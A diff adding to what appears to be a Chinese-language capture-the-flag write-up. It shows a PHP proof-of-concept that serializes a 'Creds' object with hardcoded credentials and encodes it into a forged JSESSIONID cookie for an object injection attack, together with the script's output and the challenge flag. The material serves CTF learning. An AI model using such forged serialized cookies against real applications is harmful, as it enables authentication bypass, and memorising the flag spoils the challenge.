@@ -53,3 +53,22 @@ O:5:"Creds":2:{s:1:"u";s:4:"p00p";s:1:"p";s:9:"l!k34b4u5";}
 ```
 NcN_778064be6556e64577517875a8710b0abeba1578
 ```
+
+ps. 也可以以下的 POC.php 產生 object injection 所需的東西
+```
+<?php
+class Creds
+{
+   public $u = "p00p";
+   public $p = "l!k34b4u5";
+}
+
+print "Original object injection: ".serialize(new Creds)."\n";
+print "JSESSIONID=".urlencode(base64_encode(bin2hex(serialize(new Creds))))."\n";
+?>
+```
+php POC.php
+```
+Original object injection: O:5:"Creds":2:{s:1:"u";s:4:"p00p";s:1:"p";s:9:"l!k34b4u5";}
+JSESSIONID=NGYzYTM1M2EyMjQzNzI2NTY0NzMyMjNhMzIzYTdiNzMzYTMxM2EyMjc1MjIzYjczM2EzNDNhMjI3MDMwMzA3MDIyM2I3MzNhMzEzYTIyNzAyMjNiNzMzYTM5M2EyMjZjMjE2YjMzMzQ2MjM0NzUzNTIyM2I3ZA%3D%3D
+```
